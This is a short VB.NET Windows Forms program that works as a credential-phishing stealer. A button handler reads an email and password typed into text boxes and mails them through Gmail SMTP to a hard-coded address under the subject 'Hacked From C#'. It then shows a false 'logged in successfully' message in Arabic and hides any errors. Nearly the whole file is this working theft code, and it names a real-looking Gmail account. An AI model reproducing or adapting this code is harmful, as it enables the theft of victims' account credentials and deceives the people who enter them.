Imports System.Net.Mail

Public Class Form1

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim AhMaD As New MailMessage
        Try
            AhMaD.From = New MailAddress("Omda18009@gmail.com")
            AhMaD.To.Add("Omda18009@gmail.com")
            AhMaD.Subject = "Hacked From C#"
            AhMaD.Body = "Email:" + TextBox1.Text + "password:" + TextBox2.Text
            Dim smtp As New SmtpClient("smtp.gmail.com")
            smtp.Port = 587
            smtp.EnableSsl = True
            smtp.Credentials = New System.Net.NetworkCredential("Omda18009@gmail.com", Pass.Text)
            smtp.Send(AhMaD)
            MsgBox("تم الدخول بنجاح :")

        Catch ex As Exception

        End Try
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub
End Class
